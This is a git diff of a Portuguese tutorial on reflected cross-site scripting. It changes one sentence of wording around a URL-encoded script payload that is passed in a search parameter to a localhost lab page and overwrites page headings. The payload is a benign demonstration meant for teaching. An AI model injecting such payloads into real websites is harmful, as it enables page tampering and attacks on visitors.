@@ -188,7 +188,7 @@ Ao converter para *URL Encode*:
 %3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E
 ```
 
-Tento a seguinte URL final:
+Gerando a seguinte URL:
 
 - [http://localhost/01/?search=%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E](http://localhost/01/?search=%3Cscript%3E%0A%09document.getElementsByTagName%28%22h1%22%29%5B0%5D.innerHTML%20%3D%20%22Modificado%21%22%3B%0A%09document.getElementsByTagName%28%22h2%22%29%5B2%5D.innerHTML%20%3D%20%22Modificado%20Tamb%C3%A9m%21%22%3B%0A%3C%2Fscript%3E)
 
